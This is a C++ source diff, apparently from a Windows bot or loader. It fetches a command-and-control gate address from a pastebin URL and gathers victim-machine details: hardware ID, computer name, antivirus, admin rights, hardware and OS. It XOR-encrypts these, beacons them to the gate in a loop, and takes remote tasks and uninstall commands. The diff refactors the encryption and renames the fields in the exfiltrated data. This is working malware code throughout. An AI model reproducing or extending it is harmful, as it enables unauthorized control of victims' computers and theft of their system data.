@@ -18,6 +18,7 @@
 #include <comutil.h>
 #include "Helpers.hpp"
 #include "OsHelpers.hpp"
+#include "XOR.h"
 
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
@@ -33,14 +34,7 @@ struct ComInit
 	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
 };
 
-std::string encryptDecrypt(std::string toEncrypt) {
-	Config config;
-	std::string output = toEncrypt;
-	for (int i = 0; i < toEncrypt.size(); i++)
-		output[i] = toEncrypt[i] ^ config.key[i % (sizeof(config.key) / sizeof(char))];
 
-	return output;
-}
 
 #if _DEBUG
 int main(int argc, char* argv[]) {
@@ -69,7 +63,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		//Fetch Gate from raw Site
 		http::Request request(config.pastebinUrl);
 		http::Response response = request.send("GET");
-		std::string gateFromPatebin = encryptDecrypt(Helpers::responseToString(response));
+		std::string gateFromPatebin = XOR::encryptDecrypt(Helpers::responseToString(response));
 		//Net Framwork Check
 		std::string netFramework2 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
 		std::string netFramework3 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
@@ -81,33 +75,29 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
 		std::string args = "hwid=" + guid +
-			"&username=" + encryptDecrypt(Helpers::getComputerName()) +
-			"&nf2=" + encryptDecrypt(netFramework2) +
-			"&nf3=" + encryptDecrypt(netFramework3) +
-			"&nf35=" + encryptDecrypt(netFramework35) +
-			"&nf4=" + encryptDecrypt(netFramework4) +
-			"&av=" + Helpers::getCurrentAv() +
-			"&cpu=" + OsHelpers::getCpuName() +
-			"&gpu=" + OsHelpers::getGpuName() +
-			"&ram=" + OsHelpers::getRam() +
-			"&os=" + Helpers::GetWindowsVersionString() +
+			"&computername=" + Helpers::getComputerName() +
+			"&cpuName=" + OsHelpers::getCpuName() +
 			"&aornot=" + OsHelpers::checkPEIsAdmin() +
-			"&arch=" + OsHelpers::PrcessorArchitecture() +
-			"&botversion=" + encryptDecrypt("2.0");
-
+			"&gpuName=" + OsHelpers::getCpuName() +
+			"&prcessorArchitecture=" + OsHelpers::PrcessorArchitecture() +
+			"&installedRam=" + OsHelpers::getRam() +
+			"&netFramework2=" + netFramework2 +
+			"&netFramework3=" + netFramework3 +
+			"&netFramework35=" + netFramework35 +
+			"&netFramework4=" + netFramework4 +
+			"&antivirus=" + Helpers::getCurrentAv() +
+			"&botversion=2.1" +
+			"&operingsystem=" + Helpers::GetWindowsVersionString();
+		std::string finalPost = "request="+XOR::encryptReqeust(args);
 		while (true) {
 			try {
 				http::Request request2(gateFromPatebin);
 				http::Response respons2e = request2.send("POST",
-					args,
+					finalPost,
 					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 				);
 				std::string responseFromGate = Helpers::responseToString(respons2e);
-				//TODO Handle Tasks Function
-				//Java Support?
-				//32x64 Bit CPU (&& Model?)
-				std::cout << responseFromGate;
-				std::string substring = "newtask";
+				std::string substring = "dande";
 				if (responseFromGate.find(substring) != std::string::npos) {
 					//New task Found
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
@@ -119,13 +109,12 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 					http::Request request2(gateFromPatebin);
 					http::Response respons2e = request2.send("POST",
 						"hwid=" + guid +
-						"&ps=" + started +
-						"&id=" + v[1],
+						"&taskstatus=" + started +
+						"&taskid=" + v[0],
 						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 					);
-					
-					//std::cout << started;
-				}else {
+				}
+				else {
 					if (responseFromGate.find("uninstall") != std::string::npos) {
 						//t1.detach();
 						//t2.detach();
